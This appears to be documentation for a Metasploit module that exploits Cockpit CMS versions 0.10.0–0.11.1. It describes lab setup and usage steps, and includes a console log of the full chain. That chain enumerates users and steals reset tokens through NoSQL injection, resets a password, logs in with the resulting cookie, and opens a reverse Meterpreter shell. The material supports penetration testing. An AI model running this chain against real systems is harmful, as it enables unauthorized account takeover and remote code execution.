## Vulnerable Application

This module exploits two NoSQLi vulnerabilities to retrieve the user list,
and password reset tokens from the system.  Next, the USER is targetted to
reset their password.

Then a command injection vulnerability is used to execute the payload.
While it is possible to upload a payload and execute it, the command injection
provides a no disk write method which is more stealthy.

The following versions of Cockpit CMS contain all the necessary vulnerabilities for exploitation:

* 0.11.1
* 0.11.0
* 0.10.2
* 0.10.1
* 0.10.0

### Install

Use docker:

```
docker run -p 8080:80 agentejo/cockpit:0.10.0
```

Or follow https://blog.sommerfeldsven.de/how-to-install-cockpit-cms-on-nginx/

MAKE SURE TO BROWSE TO `/install` TO FINISH INSTALL!!

Some useful addresses which don't seem to be well documented:

* `/finder` for a file system browser
* `/accounts` for adding accounts
* `/install` to finish install

## Verification Steps

1. Install the application
1. Start msfconsole
1. Do: `use exploit/multi/http/cockpit_cms_rce`
1. Do: `run`
1. Do: `set USER [user]`
1. Do: `run`
1. You should get a shell.

## Options

### ENUM_USERS

Use CVE-2020-35846 to enumerate users on the system.

### USER

Username to reset the password of, and login as to perform the command injection with. Defaults to `''`

## Scenarios

### Cockpit CMS 0.11.1 on Ubuntu 20.04

#### Obtain list of users

```
[*] Processing cockpit.rb for ERB directives.
resource (cockpit.rb)> use exploit/multi/http/cockpit_cms_rce
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
resource (cockpit.rb)> set rhosts 2.2.2.2
rhosts => 2.2.2.2
resource (cockpit.rb)> set verbose true
verbose => true
msf6 exploit(multi/http/cockpit_cms_rce) > check

[*] Attempting Username Enumeration (CVE-2020-35846)
[*] 2.2.2.2:80 - The target appears to be vulnerable.
msf6 exploit(multi/http/cockpit_cms_rce) > run

[*] Started reverse TCP handler on 1.1.1.1:4444 
[*] Attempting Username Enumeration (CVE-2020-35846)
[+]   Found users: ["admin", "asdf22", "4g4gsegs"]
[-] Exploit aborted due to failure: bad-config: 2.2.2.2:80 - User to exploit required
[*] Exploit completed, but no session was created.
```

#### Exploit user

```
msf6 exploit(multi/http/cockpit_cms_rce) > set user asdf22
user => asdf22
msf6 exploit(multi/http/cockpit_cms_rce) > exploit

[*] Started reverse TCP handler on 1.1.1.1:4444 
[*] Attempting Username Enumeration (CVE-2020-35846)
[+]   Found users: ["admin", "asdf22", "4g4gsegs"]
[*] Obtaining reset tokens (CVE-2020-35847)
[*] Attempting to generate tokens
[*] Obtaining reset tokens (CVE-2020-35847)
[+]   Found tokens: ["rp-09397d385d8b4d781906f1bde62a3da8607c4193bc15c"]
[*] Checking token: rp-09397d385d8b4d781906f1bde62a3da8607c4193bc15c
[*] Obtaining user info
[*]   user: asdf22
[*]   email: none@none.com
[*]   active: true
[*]   group: admin
[*]   i18n: en
[*]   api_key: account-8d9e39cf206a7392d292efc281e824
[*]   password: $2y$10$R4mShvdxnXxxnTH85apRLedSWfYbOk4qsGQwG7apOfdQBVRnhEcme
[*]   name: dsf22
[*]   _modified: 1618755509
[*]   _created: 1618755500
[*]   _id: 607c3fac62336679e30002c3
[*]   _reset_token: rp-09397d385d8b4d781906f1bde62a3da8607c4193bc15c
[*]   md5email: 3eda6fcd3204ef285fa52176c28c4d3e
[+] Changing password to BoicMQSMPv
[+] Password update successful
[*] Attempting login
[+] Valid cookie for asdf22: c8695f6d766afc426d0e99f58fb04e0d=d3t7e356h03eufhuc55g91kgsb;
[*] Attempting RCE
[*] Sending stage (39282 bytes) to 2.2.2.2
[*] Meterpreter session 1 opened (1.1.1.1:4444 -> 2.2.2.2:37260) at 2021-04-18 10:26:27 -0400

meterpreter > getuid
Server username: www-data (33)
meterpreter > sysinfo
Computer    : ubuntu2004
OS          : Linux ubuntu2004 5.4.0-56-generic #62-Ubuntu SMP Mon Nov 23 19:20:19 UTC 2020 x86_64
Meterpreter : php/linux
```
